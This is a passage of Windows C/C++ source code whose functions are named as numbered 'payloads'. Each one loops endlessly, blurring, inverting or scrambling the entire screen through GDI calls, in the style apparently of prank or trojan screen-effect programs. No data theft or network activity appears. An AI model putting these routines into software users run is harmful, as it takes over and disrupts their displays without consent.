        bmpi.bmiHeader.biBitCount = 32;
        bmpi.bmiHeader.biCompression = BI_RGB;
        bmp = CreateDIBSection(dc, &bmpi, 0, 0, NULL, 0);
        SelectObject(dcCopy, bmp);
        blur.BlendOp = AC_SRC_OVER;
        blur.BlendFlags = 0;
        blur.AlphaFormat = 0;
        blur.SourceConstantAlpha = 60;
        BitBlt(dc, 0, 0, w, h, dc, 0, 0, SRCCOPY);
        AlphaBlend(dc, 0, 0, w, h, dcCopy, 0, 0, w, h, blur);
        ReleaseDC(0, dc);
        DeleteDC(dc);
        DeleteDC(dcCopy);
        DeleteObject(dcCopy);
        DeleteObject(bmp);
        Sleep(50);
    }
}

DWORD WINAPI Payload19_num3(LPVOID lpParam) {
    srand(time(NULL));
    while (true) {
        int w = GetSystemMetrics(0); int h = GetSystemMetrics(1);
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                int line1 = rand() % 3;
                if (line1 == 0) {
                    line1 = 1;
                }

                if (line1 == 1) {
                    StretchBlt(hcdc, x - 3, y, 1, 1, hcdc, x - 3, y, 1, 1, 6668742);
                }
                else if (line1 == 2) {
                    StretchBlt(hcdc, x + 3, y, 1, 1, hcdc, x + 3, y, 1, 1, 6668742 | 3342344);
                }
                else if (line1 == 3) {
                    StretchBlt(hcdc, x + 3, y, 1, 1, hcdc, x + 3, y, 1, 1, 3342344);
                }
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        DeleteDC(hcdc);
        DeleteObject(hcdc);
        DeleteObject(hBitmap);
        Sleep(1);
    }
}

DWORD WINAPI Payload19_num4(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    while (1) {
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        StretchBlt(hcdc, -10, -10, w + 20, h + 20, hdc, 0, 0, w, h, SRCCOPY);
        StretchBlt(hcdc, 10, 10, w - 20, h - 20, hcdc, 0, 0, w, h, SRCINVERT);
        BLENDFUNCTION blf = BLENDFUNCTION{ AC_SRC_OVER, 1, 50, 0 };
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blf);
        DeleteObject(hcdc);
        DeleteObject(hBitmap);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI Payload20_num1(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(NULL);
        int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
        BITMAPINFO bmi = { 0 };
        bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biWidth = w;
        bmi.bmiHeader.biHeight = h;
        PRGBQUAD prgbScreen;
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, 0, (void**)&prgbScreen, NULL, 0);
        SelectObject(hcdc, hBitmap);
        hdc = GetDC(NULL);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < w * h; i++) {
            prgbScreen[i].r = rand() % 255;
            prgbScreen[i].g = rand() % 255;
            prgbScreen[i].b = rand() % 255;
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteObject(hdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc);
        Sleep(1);
    }
}